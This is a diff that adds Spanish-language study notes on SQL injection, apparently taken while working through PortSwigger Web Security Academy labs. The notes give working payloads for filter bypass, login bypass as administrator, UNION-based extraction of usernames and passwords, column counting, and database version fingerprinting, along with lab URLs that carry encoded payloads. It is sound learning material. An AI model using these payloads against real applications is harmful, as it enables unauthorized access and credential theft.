@@ -1,1 +1,73 @@
-# Notas Generales
+# NOTAS GENERALES
+
+# SQL INJECTION VULNERABILITY IN WHERE CLUASE ALLOWING RETRIEVAL OF HIDDEN DATA
+
+-- / en lenguaje SQL es para comentar una oracion de manera que lo que se agregue despues del simbolo "--" no es leido.
+ex: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+
+'+OR+1=1-- / sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no.
+ex: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+' or 1=1 --' / muestra todo el contenido de la variable vulnerable. 
+
+https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+https://0a94007003d97f86c44635900063000b.web-security-academy.net/filter?category=%27%20or%201=1%20--%27
+
+# SQL INJECTION VULNERABILITY ALLOWING LOGIN BYPASS [Subverting application logic]
+
+administrator-- / cuando el login form es vulnerable es importante intentar como primera opcion una vez se tenga un usuario, intentar hacer bypass del
+password como tal. agregando los flags de comentar, hace que ignore el resto del query en background.
+
+ex: SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+# RETRIEVING DATA FROM OTHER DATABASE TABLES
+
+ex: SELECT name, description FROM products WHERE category = 'Gifts' ' UNION SELECT username, password FROM users--
+
+cuando la aplicacion responde con informacion que esta alojada en la base de datos, se puede hacer uso del "UNION" flag dentro del 
+SQL query para mostrar la informacion  
+
+>>> IMPORTANTE: cuando los resultados son mostrados en la respuesta de la consulta, el UNION puede funcionar. debe cumplir con 2 condiciones
+>>>>> numero1: la tabla a consultar debe tener el mismo numero de columnas.
+>>>>> numero2: los fields a consultar deben ser iguales, por ejemplo, string, integer, etc.
+
+Como saber cuantas columnas tiene ?
+
+existen 2 metodos, 
+numero1: ' ORDER BY 1--
+este metodo funciona inyectando una serie de flags [' ORDER BY 1--] con un consecutivo de manera que el numero incremental va 
+a definir la cantidad de columnas una vez se obtenga un error en la consulta, o bien ningun resultado. el ultimo numero consecutivo define la cantidad de columnas.
+las columnas pueden ser manejadas por medio del index number, no hace falta saber el nombre de la columna ya que lo que se necesita es saber la
+cantidad de columnas.
+
+numero2: ' UNION SELECT NULL--
+este metodo es similar al pasado, se trata de inyectar el payload de ejemplo con un consecutivo pero en este caso lo que trata es de validar 
+si hay columna o no con un NULL request. con el primer NULL definiria si existe una columna, para seguir el consecutivo solamente debe de 
+agregar [,] y se agregan la cantidad de NULL requests hasta mostrar el error, o no mostrar nada. tambien podria ser un resultado esperado para este
+tipo de consultas.
+
+ex:https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+https://0a480082030be0d7c91cf44e00b30018.web-security-academy.net/filter?category=Gifts%27%20UNION%20select%20NULL,NULL,NULL--
+
+NOTA: para ORACLE, es necesario utilizar dentro de la sintaxis de la consulta el FROM flag y especificar la tabla. por default ORACLE tiene una tabla
+que se llama DUAL, esa tabla puede ser usada para aplicar este metodo. por ultimo, cuando se utiliza el flag de comentar [--], es necesario un espacio 
+al final para que funcione.
+
+' UNION SELECT NULL FROM DUAL--
+
+# EXAMINING THE DATABASE IN SQL INJECTION ATTACKS
+
+existen distintos motores de bases de datos, los mas comunes son: Microsoft, MySQL, Oracle y PostgreSQL. cada uno tiene su manera de mostrar la informacion,
+para mostrar la informacion es necesario hacer uso del [UNION] flag.
+
+Microsoft : SELECT @@version
+MySQL : SELECT @@version
+Oracle : SELECT * FROM v$version | %27%20UNION%20select%20banner,%20null%20from%20v$version--
+PostgreSQL : SELECT version()
+
+' UNION SELECT @@version--
+
+https://0a1c00f10374a73ac002407000d400b6.web-security-academy.net/filter?category=Accessories%27%20UNION%20select%20banner,%20null%20from%20v$version--
+es importante notar que el query va a ser igual, si son 2 columnas, se va a utilizar las dos columnas en la consulta.
+
+
